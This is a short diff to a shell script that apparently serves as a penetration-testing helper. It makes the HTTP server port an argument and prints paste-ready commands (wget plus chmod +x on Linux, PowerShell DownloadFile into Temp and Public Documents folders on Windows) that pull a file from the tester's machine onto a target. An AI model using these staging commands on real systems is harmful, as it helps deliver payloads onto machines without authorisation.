@@ -15,7 +15,7 @@ if [ "$ip" == "" ]; then
 	ip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
 fi
 
-port=8888
+port=$2
 
 echo -e "${Frame}###${End} ${Title}Linux${End} ${Frame}###${End}"
 echo -e "${Point} wget http://$ip:$port/$1 -O /tmp/$1; chmod +x /tmp/$1"
@@ -25,7 +25,8 @@ echo -e ""
 
 echo -e "${Frame}###${End} ${Title}Windows${End} ${Frame}###${End}"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$1','C:\\\Windows\\\Temp\\\\$1')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$1','C:\\\Users\\\Public\\\Documents\\\\$1')"
 echo -e ""
 
 # open http server
-sudo python3 -m http.server 8888
+sudo python3 -m http.server $port
